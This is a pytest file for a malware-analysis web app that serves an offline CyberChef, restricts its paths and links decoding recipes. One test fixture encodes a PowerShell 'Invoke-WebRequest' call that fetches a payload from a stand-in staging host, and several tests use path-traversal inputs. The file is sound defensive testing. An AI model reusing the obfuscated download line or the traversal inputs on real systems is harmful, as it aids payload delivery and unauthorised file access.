"""The offline CyberChef: served only when installed, locked to this machine,
and linked from the analysis page with the recipe the engine found."""
import base64
import gzip
import importlib.util
import io
import json
import zipfile
from pathlib import Path

import pytest

from plaguardsv2.GuardModules import PlagMagic
from plaguardsv2.PlagWeb import create_app, cyberchef

ENTRY = "CyberChef_v0.0.0.html"


@pytest.fixture
def installed(tmp_path, monkeypatch):
    (tmp_path / ENTRY).write_text("<!doctype html><title>CyberChef</title>", encoding="utf-8")
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "main.js").write_text("// chef", encoding="utf-8")
    (tmp_path / cyberchef.MANIFEST).write_text(
        json.dumps({"version": "v0.0.0", "entry": ENTRY}), encoding="utf-8")
    monkeypatch.setenv("PLAGUARDSV2_CYBERCHEF_DIR", str(tmp_path))
    return tmp_path


@pytest.fixture
def client(tmp_path):
    app = create_app(str(tmp_path / "web.db"))
    app.config["TESTING"] = True
    return app.test_client()


def test_not_installed_means_not_found(client, tmp_path, monkeypatch):
    monkeypatch.setenv("PLAGUARDSV2_CYBERCHEF_DIR", str(tmp_path / "missing"))
    assert client.get("/cyberchef/").status_code == 404


def test_installed_copy_is_served_with_a_lockdown_policy(installed, client):
    resp = client.get("/cyberchef/")
    assert resp.status_code == 200
    csp = resp.headers["Content-Security-Policy"]
    assert "connect-src 'self'" in csp and "default-src 'self'" in csp
    assert resp.headers["Referrer-Policy"] == "no-referrer"
    assert client.get("/cyberchef/assets/main.js").status_code == 200


def test_manifest_and_paths_outside_the_install_are_not_served(installed, client):
    assert client.get("/cyberchef/" + cyberchef.MANIFEST).status_code == 404
    assert client.get("/cyberchef/../__init__.py").status_code == 404
    assert client.get("/cyberchef/%2e%2e/__init__.py").status_code == 404


def test_a_manifest_naming_a_path_is_rejected(installed):
    (installed / cyberchef.MANIFEST).write_text(
        json.dumps({"version": "x", "entry": "../secret.html"}), encoding="utf-8")
    assert cyberchef.manifest() is None


def _analyze(client, text: str) -> str:
    resp = client.post("/analyze", data={
        "file": (io.BytesIO(text.encode()), "sample.ps1"), "skip_intel": "on",
    }, content_type="multipart/form-data")
    assert resp.status_code == 302
    return client.get(resp.headers["Location"]).get_data(as_text=True)


SAMPLE = "$c = '" + base64.b64encode(gzip.compress(
    b"Invoke-WebRequest http://stage-c.example.invalid/c.bin", mtime=0)).hex() + "'"


def test_analysis_page_lists_the_recipe_and_links_cyberchef(installed, client):
    page = _analyze(client, SAMPLE)
    assert "From Hex &gt; From Base64 &gt; Gunzip" in page
    assert "/cyberchef/#recipe=" in page
    # Defanged like every other value on the page.
    assert "hxxp://stage-c[.]example[.]invalid" in page


def test_without_cyberchef_the_page_says_how_to_install_it(client, tmp_path, monkeypatch):
    monkeypatch.setenv("PLAGUARDSV2_CYBERCHEF_DIR", str(tmp_path / "missing"))
    page = _analyze(client, SAMPLE)
    assert "From Hex &gt; From Base64 &gt; Gunzip" in page
    assert "tools/fetch_cyberchef.py" in page
    assert "/cyberchef/#" not in page


def test_link_carries_the_engine_recipe(installed, client):
    with client.application.test_request_context():
        url = client.application.jinja_env.globals["chef_url"]("abcd" * 8, [{"op": "ROT13", "args": []}])
    assert url.startswith("/cyberchef/#recipe=") and "ROT13" in url


# Installer

def _fetcher():
    path = Path(__file__).resolve().parents[1] / "tools" / "fetch_cyberchef.py"
    spec = importlib.util.spec_from_file_location("fetch_cyberchef", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _zip(tmp_path: Path, members: dict) -> Path:
    archive = tmp_path / "chef.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return archive


def test_installer_extracts_and_finds_the_entry_page(tmp_path):
    archive = _zip(tmp_path, {ENTRY: "<html>", "assets/main.js": "//"})
    assert _fetcher()._extract(archive, tmp_path / "out") == ENTRY
    assert (tmp_path / "out" / "assets" / "main.js").is_file()


def test_installer_refuses_a_member_outside_the_install_folder(tmp_path):
    archive = _zip(tmp_path, {ENTRY: "<html>", "../escaped.txt": "x"})
    with pytest.raises(SystemExit):
        _fetcher()._extract(archive, tmp_path / "out")
    assert not (tmp_path / "escaped.txt").exists()


def test_magic_recipe_ops_exist_in_the_installed_cyberchef():
    """Every op name PlagMagic emits must be one CyberChef knows, or the
    linked recipe silently drops a step. Checked against the real install
    when there is one."""
    info = cyberchef.manifest()
    if info is None:
        pytest.skip("offline CyberChef not installed")
    bundle = (cyberchef.install_dir() / "assets" / "main.js").read_text(encoding="utf-8", errors="replace")
    ops = {"From Base64", "From Base32", "From Base58", "From Base85", "From Hex", "From Decimal",
           "From Charcode", "From Octal", "From Binary", "URL Decode", "From HTML Entity",
           "Unescape string", "From Quoted Printable", "Gunzip", "Zlib Inflate", "Raw Inflate",
           "Bzip2 Decompress", "LZMA Decompress", "Decode text", "Reverse", "ROT13", "ROT47", "XOR",
           "Magic"}
    missing = sorted(op for op in ops if f'"{op}"' not in bundle)
    assert not missing, missing
    assert PlagMagic.MAGIC_RECIPE[0]["op"] == "Magic"
